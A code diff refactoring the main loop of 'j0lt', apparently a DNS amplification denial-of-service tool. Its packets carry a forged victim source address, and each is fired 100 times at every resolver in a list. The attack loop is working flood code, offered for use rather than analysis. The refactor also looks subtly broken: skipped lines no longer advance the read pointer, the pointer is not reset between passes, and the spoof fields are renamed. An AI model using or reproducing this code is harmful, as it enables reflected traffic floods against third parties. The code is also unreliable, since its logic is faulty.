@@ -156,7 +156,6 @@ DEFINE_INSERT_FN(qword, uint64_t)
 #define PEWPEW_J0LT 100  // value for the tmc effect.
 #define MAX_LINE_SZ_J0LT 0x30
 
-
 GLOBAL_STRING_TYPE GLOBAL_STRING_MENU = {
     " =========================================================\n"
     " Usage: sudo ./j0lt -t -p -n [OPTION]...                  \n"
@@ -182,45 +181,72 @@ bool insert_ip_header(uint8_t **buf, size_t *buflen, PSEUDOHDR *pheader,
 bool send_payload(const uint8_t *datagram, uint32_t daddr, uint16_t uh_dport,
                   size_t nwritten);
 
+void debug_print(bool condition, const char *message, int value) {
+  if (condition) printf(message, value);
+}
+
+bool is_valid_ip4(const char *str) {
+  int i;
+  for (i = 0; isdigit(str[i]); i++);
+  return str[i] == '.';
+}
+
+void send_attacks(const char *payload, size_t szpayload, in_addr_t resolvip,
+                  bool debug_mode, int hex_mode) {
+  if (debug_mode == 0) {
+    size_t szpewpew = PEWPEW_J0LT;
+    while (szpewpew-- > 0)
+      send_payload((uint8_t *)payload, resolvip, htons(NS_DEFAULTPORT),
+                   szpayload);
+  }
+  if (hex_mode == 1) print_hex(payload, szpayload);
+}
+
+Result_T perform_attack(JoltOptions opts, void *resolvlist_buffer,
+                        size_t szresolvlist) {
+  char payload[NS_PACKETSZ], lineptr[MAX_LINE_SZ_J0LT];
+  char *resolvptr = (char *)resolvlist_buffer;
+
+  while (opts.nthreads >= 1) {
+    int nread = 0;
+    debug_print(opts.debug_mode, "+ current attack nthreads %d \n",
+                opts.nthreads);
+
+    while ((nread = readline(lineptr, resolvptr, MAX_LINE_SZ_J0LT,
+                             szresolvlist)) != 0) {
+      if (!is_valid_ip4(lineptr)) continue;
+
+      in_addr_t resolvip = inet_addr(lineptr);
+      if (resolvip == 0) continue;
+
+      size_t szpayload = forge_j0lt_packet(payload, htonl(resolvip),
+                                           htonl(opts.ip), opts.port);
+      send_attacks(payload, szpayload, resolvip, opts.debug_mode,
+                   opts.hex_mode);
+
+      resolvptr += nread;
+      szresolvlist -= nread;
+    }
+    opts.nthreads--;
+  }
+  return RESULT_SUCCESS;
+}
+
 int main(int argc, char **argv) {
   printf("%s", GLOBAL_STRING_MENU);
 
   JoltOptions opts;
-  CHECK_SUCCESS(parse_opts(&opts, argc, (const char **)argv), "* parse_opts error");
+  CHECK_SUCCESS(parse_opts(&opts, argc, (const char **)argv),
+                "* parse_opts error");
 
   void *resolvlist_buffer = NULL;
   size_t szresolvlist = 0;
-  CHECK_SUCCESS(get_resolver_list(&resolvlist_buffer, &szresolvlist), "* get_resolver_list error");
+  CHECK_SUCCESS(get_resolver_list(&resolvlist_buffer, &szresolvlist),
+                "* get_resolver_list error");
 
-  char payload[NS_PACKETSZ], lineptr[MAX_LINE_SZ_J0LT];
-  while (opts.nthreads >= 1) {
-    int nread = 0;
-    char *resolvptr = (char *)resolvlist_buffer;
-    if (opts.debug_mode == true)
-      printf("+ current attack nthreads %d \n", opts.nthreads);
-    while ((nread = readline(lineptr, resolvptr, MAX_LINE_SZ_J0LT,
-                             szresolvlist)) != 0) {
-      resolvptr += nread;
-      szresolvlist -= nread;
-      int i;
-      for (i = 0; isdigit(lineptr[i]); i++);
-      if (lineptr[i] != '.')  // check ip4
-        continue;
+  CHECK_SUCCESS(perform_attack(opts, resolvlist_buffer, szresolvlist),
+                "* performattack error");
 
-      in_addr_t resolvip = inet_addr(lineptr);
-      if (resolvip == 0) continue;
-      size_t szpayload = forge_j0lt_packet(payload, htonl(resolvip),
-                                    htonl(opts.spoof_ip), opts.spoof_port);
-      if (opts.debug_mode == 0) {
-        size_t szpewpew = PEWPEW_J0LT;
-        while (szpewpew-- > 0)
-          send_payload((uint8_t *)payload, resolvip, htons(NS_DEFAULTPORT),
-                       szpayload);
-      }
-      if (opts.hex_mode == 1) print_hex(payload, szpayload);
-    }
-    opts.nthreads--;
-  }
   free(resolvlist_buffer);
 
   return 0;
